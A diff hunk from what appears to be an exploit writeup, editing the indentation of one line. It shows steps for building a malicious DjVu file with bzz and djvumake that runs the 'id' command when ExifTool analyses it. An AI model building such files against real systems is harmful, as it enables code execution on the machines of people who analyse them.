@@ -19,7 +19,7 @@ $bzz payload payload.bzz
 `
 Making .djvu file using djvumake utility
 	
-	It will execute id command when someone tries to analyze it with Exiftool.
+It will execute id command when someone tries to analyze it with Exiftool.
 `
 $djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
 `
